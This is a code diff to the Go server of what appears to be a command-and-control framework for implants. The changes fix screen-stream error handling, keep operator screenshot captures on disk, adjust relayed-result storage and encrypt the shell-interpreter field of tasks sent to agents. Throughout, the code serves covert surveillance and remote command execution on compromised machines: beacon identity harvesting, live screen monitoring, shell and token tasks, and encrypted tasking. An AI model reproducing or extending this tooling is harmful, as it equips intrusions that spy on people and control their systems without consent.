@@ -880,6 +880,26 @@ func decodeBeaconIdentity(info map[string]string) (hostname, username, ip string
 	return hostname, username, ip
 }
 
+// applyDecodedBeaconIdentity rewrites the info map in-place: base64-encoded
+// values are decoded and the "encoding" key is removed.
+func applyDecodedBeaconIdentity(info map[string]string) {
+	if info == nil {
+		return
+	}
+	if info["encoding"] == "base64" {
+		if decoded, err := base64.StdEncoding.DecodeString(info["hostname"]); err == nil {
+			info["hostname"] = string(decoded)
+		}
+		if decoded, err := base64.StdEncoding.DecodeString(info["username"]); err == nil {
+			info["username"] = string(decoded)
+		}
+		if decoded, err := base64.StdEncoding.DecodeString(info["ip"]); err == nil {
+			info["ip"] = string(decoded)
+		}
+		delete(info, "encoding")
+	}
+}
+
 var allowedInfoKeys = map[string]bool{
 	"hostname": true, "ip": true, "public_ip": true, "os": true, "arch": true,
 	"username": true, "integrity": true, "elevated": true, "domain": true,
@@ -1248,6 +1268,18 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 			}
 			continue
 		}
+		if r.Type == "screen_stream_error" {
+			errorMessage := strings.TrimSpace(r.Error)
+			if errorMessage == "" {
+				errorMessage = strings.TrimSpace(r.Output)
+			}
+			if errorMessage == "" {
+				errorMessage = "screen stream stopped unexpectedly"
+			}
+			slog.Warn("Screen stream stopped on agent", "agent_id", uuid, "error", errorMessage)
+			s.BroadcastScreenMonitorError(uuid, errorMessage)
+			continue
+		}
 		if r.Type == "screen_trigger" && r.Output != "" {
 			s.writeScreenshotFile(s.cfg.Server.DataDir, uuid, r.TaskID, r.Output)
 			s.BroadcastScreenshot(uuid, r.Output)
@@ -1340,8 +1372,11 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 		if r.Type == "screen_stream_start" || r.Type == "screen_stream_stop" {
 			task.Result = "processed"
 			s.broadcastTaskUpdate(uuid, *task)
-			if err := s.db.Delete(task).Error; err != nil {
-				slog.Error("Failed to delete screen control task", "task_id", task.ID, "error", err)
+			if r.Type == "screen_stream_start" && task.Status == "failed" {
+				s.BroadcastScreenMonitorError(uuid, task.Error)
+			}
+			if err := s.db.Save(task).Error; err != nil {
+				slog.Error("Failed to save screen control task", "task_id", task.ID, "error", err)
 			}
 			continue
 		}
@@ -1354,17 +1389,15 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 			s.autoSwitchSleepMask(uuid, r.Output)
 		}
 
-		if r.Type == "screenshot" && r.Output != "" {
+		if (r.Type == "screenshot" || r.Type == "screenshot_window") && r.Output != "" {
 			slog.Info("Processing screenshot result", "agent_id", uuid, "task_id", r.TaskID)
-
+			// Explicit operator captures are durable even while live monitoring is
+			// active. Continuous screen_frame messages remain memory-only, so this
+			// does not turn a live stream into unbounded disk retention.
+			task.Result = r.Output
+			s.saveScreenshot(s.cfg.Server.DataDir, uuid, task.ID, r.Output)
 			if s.IsScreenMonitoring(uuid) {
-				task.Result = "[live screen monitoring - not retained]"
 				s.BroadcastScreenshot(uuid, r.Output)
-				slog.Info("Screen frame received (monitoring - not saved to file)", "agent_id", uuid)
-			} else {
-				// Keep as base64 so the frontend can directly use it in data: URL
-				task.Result = r.Output
-				s.saveScreenshot(s.cfg.Server.DataDir, uuid, task.ID, r.Output)
 			}
 		} else if (r.Type == "upload" || r.Type == "download") && r.Encoding == "base64" {
 			task.Result = r.Output
@@ -1569,21 +1602,21 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 						slog.Error("Plugin hook panicked", "agent_id", uuid, "recover", r)
 					}
 				}()
-			ctx, cancel := context.WithTimeout(s.ctx, PluginHookTimeout)
-			defer cancel()
-			if err := s.pluginManager.ExecuteHook(ctx, plugin.Event{
-				Type:      plugin.EventTaskCompleted,
-				Timestamp: now,
-				AgentID:   uuid,
-				Payload: map[string]interface{}{
-					"task_id":   task.ID,
-					"task_type": task.Type,
-					"status":    task.Status,
-					"error":     task.Error,
-				},
-			}); err != nil {
-				slog.Warn("Hook errors on task_completed event", "agent_id", uuid, "task_id", task.ID, "err", err)
-			}
+				ctx, cancel := context.WithTimeout(s.ctx, PluginHookTimeout)
+				defer cancel()
+				if err := s.pluginManager.ExecuteHook(ctx, plugin.Event{
+					Type:      plugin.EventTaskCompleted,
+					Timestamp: now,
+					AgentID:   uuid,
+					Payload: map[string]interface{}{
+						"task_id":   task.ID,
+						"task_type": task.Type,
+						"status":    task.Status,
+						"error":     task.Error,
+					},
+				}); err != nil {
+					slog.Warn("Hook errors on task_completed event", "agent_id", uuid, "task_id", task.ID, "err", err)
+				}
 			}()
 		}
 
@@ -1767,10 +1800,14 @@ func (s *Server) processRelayedResults(relayed []relayedData, parentUUID string,
 			if len(task.Result) > MaxResultSize {
 				task.Result = truncateString(task.Result, MaxResultSize)
 			}
-			task.EncryptTaskFields()
+			// Keep the task object plaintext for operator-facing WebSocket
+			// broadcasts. Encrypt only a copy destined for storage; mutating task
+			// here leaked FC2ENC ciphertext into interactive shell output.
+			dbTask := *task
+			dbTask.EncryptTaskFields()
 			// Atomic first-final-wins: only pending/running/sent can transition to final
 			res := s.db.Model(&db.Task{}).Where("id = ? AND status IN ?", task.ID, []string{"pending", "running", "sent"}).Updates(map[string]interface{}{
-				"status": task.Status, "result": task.Result, "error": task.Error, "last_result_id": task.LastResultID,
+				"status": task.Status, "result": dbTask.Result, "error": dbTask.Error, "last_result_id": task.LastResultID,
 			})
 			if res.Error != nil {
 				slog.Error("Failed to save relayed task result", "task_id", task.ID, "child", rd.AgentID, "error", res.Error)
@@ -2041,9 +2078,12 @@ func encryptTaskPayload(s *Server, agentID string, wire *task) {
 			slog.Error("Task data encryption failed", "agent_id", agentID, "task_id", wire.ID, "error", err)
 		}
 	}
-	// Shell carries a secret only for specific types (token_make password);
-	// the agent decrypts it with the same AAD binding.
-	if db.SensitiveShellTypes[wire.Type] && wire.Shell != "" {
+	// Shell is encrypted for any wire-sensitive task that carries a Shell value
+	// (token_make password and shell interpreter such as cmd.exe / powershell).
+	// The agent decrypts Command and Shell together when Encrypted is set;
+	// leaving Shell in clear for shell tasks caused "task payload decryption
+	// failed" on the implant side.
+	if wire.Shell != "" && (db.SensitiveShellTypes[wire.Type] || wire.Type == "shell") {
 		if ct, err := s.sessionManager.EncryptB64WithAAD(agentID, []byte(wire.Shell), aad); err == nil {
 			wire.Shell = ct
 			encrypted = true
